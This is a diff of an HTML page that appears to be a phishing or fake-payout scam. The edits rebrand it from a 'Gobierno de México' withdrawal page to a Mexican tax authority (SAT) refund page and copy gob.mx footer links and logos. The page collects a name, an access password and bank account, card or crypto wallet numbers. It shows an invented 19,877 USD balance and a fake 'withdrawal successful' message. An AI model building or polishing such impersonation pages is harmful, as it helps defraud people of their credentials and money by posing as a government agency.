@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Gobierno de México - Retiros</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Retiros - SAT</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -14,80 +14,61 @@
     .container {
       background-color: white;
       max-width: 400px;
-      margin: 50px auto 0 auto;
+      margin: 50px auto;
       padding: 30px;
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    #retiroSection, #procesando, #resultado, #validando {
-      display: none;
     }
     input, select, button {
       margin: 10px 0;
       padding: 10px;
       width: 100%;
-      border: 1px solid #ccc;
-      border-radius: 5px;
     }
-    img {
-      width: 180px;
-      margin-bottom: 20px;
+    #retiroSection, #procesando, #resultado, #validando {
+      display: none;
     }
     #nombreUsuario {
       margin-top: 10px;
       font-weight: bold;
       color: #333;
     }
-
     footer {
-      background-color: #660033;
+      background-color: #600028;
       color: white;
-      padding: 40px 20px;
-      margin-top: 50px;
+      padding: 20px;
       font-size: 14px;
     }
-    .footer-content {
+    footer .footer-content {
       max-width: 1000px;
-      margin: 0 auto;
+      margin: auto;
       display: flex;
-      justify-content: space-between;
       flex-wrap: wrap;
-      text-align: left;
+      justify-content: space-between;
     }
-    .footer-section {
-      flex: 1 1 200px;
+    footer div {
       margin: 10px;
+      min-width: 150px;
     }
-    .footer-section h3 {
-      border-bottom: 1px solid #fff;
-      padding-bottom: 5px;
-      margin-bottom: 10px;
+    footer img {
+      width: 180px;
+      margin-bottom: 15px;
     }
-    .footer-section a {
+    footer a {
       color: white;
       text-decoration: none;
       display: block;
-      margin: 5px 0;
-    }
-    .social-icons {
-      display: flex;
-      gap: 10px;
-      margin-top: 10px;
-    }
-    .social-icons img {
-      width: 24px;
-      height: 24px;
+      margin: 4px 0;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="logo.png" alt="Logo del Gobierno de México" />
-    <h2>Gobierno de México - Retiros</h2>
+    <img src="LOGO.png" alt="Logo SAT" style="width:180px; margin-bottom: 20px;">
+    <h2>SAT - Solicitudes de devolución</h2>
 
     <div id="login">
-      <input type="text" id="nombre" placeholder="Nombre completo" />
-      <input type="password" id="clave" placeholder="Clave de acceso" />
+      <input type="text" id="nombre" placeholder="Nombre completo">
+      <input type="password" id="clave" placeholder="Clave de acceso">
       <button onclick="verificarAcceso()">Ingresar</button>
     </div>
 
@@ -98,7 +79,7 @@
     <div id="retiroSection">
       <p id="nombreUsuario"></p>
       <p><strong>Ganancia actual:</strong> 19,877 USD</p>
-      <input type="number" id="monto" placeholder="Monto a retirar en USD" />
+      <input type="number" id="monto" placeholder="Monto a retirar en USD">
 
       <select id="pais">
         <option value="México">México</option>
@@ -119,7 +100,7 @@
         <option value="cripto">Criptomoneda</option>
       </select>
 
-      <input type="text" id="datoPago" placeholder="Número de cuenta / tarjeta / billetera" />
+      <input type="text" id="datoPago" placeholder="Número de cuenta / tarjeta / billetera">
       <button onclick="procesarRetiro()">Solicitar retiro</button>
     </div>
 
@@ -129,43 +110,29 @@
 
     <div id="resultado">
       <h3>✅ Retiro exitoso</h3>
-      <p>Sus fondos han sido enviados correctamente. Valide en su APP bancaria.</p>
+      <p>Sus fondos han sido enviados correctamente. Verifique en su app bancaria.</p>
     </div>
   </div>
 
   <footer>
     <div class="footer-content">
-      <div class="footer-section">
-        <img src="logo.png" alt="Logo" width="120" /><br>
-        <strong>Gobierno de México</strong>
-      </div>
-      <div class="footer-section">
-        <h3>Enlace</h3>
+      <div><img src="logogob.png" alt="Logotipo Gobierno de México"></div>
+      <div>
+        <strong>Enlace</strong>
         <a href="#">Datos</a>
         <a href="#">Publicaciones</a>
-        <a href="#">Portal de Obligaciones de Transparencia</a>
+        <a href="#">Portal de Transparencia</a>
         <a href="#">INAI</a>
         <a href="#">Alerta</a>
         <a href="#">Denuncia</a>
       </div>
-      <div class="footer-section">
-        <h3>¿Qué es gob.mx?</h3>
-        <a href="#">Declaración de Accesibilidad</a>
+      <div>
+        <strong>¿Qué es gob.mx?</strong>
+        <a href="#">Portal único de trámites</a>
+        <a href="#">Accesibilidad</a>
         <a href="#">Aviso de privacidad</a>
-        <a href="#">Aviso de privacidad simplificado</a>
         <a href="#">Términos y condiciones</a>
         <a href="#">Política de seguridad</a>
-        <a href="#">Marco jurídico</a>
-        <a href="#">Mapa de sitio</a>
-      </div>
-      <div class="footer-section">
-        <h3>Síguenos en</h3>
-        <div class="social-icons">
-          <img src="facebook.png" alt="Facebook" />
-          <img src="x.png" alt="X" />
-          <img src="instagram.png" alt="Instagram" />
-          <img src="youtube.png" alt="YouTube" />
-        </div>
       </div>
     </div>
   </footer>
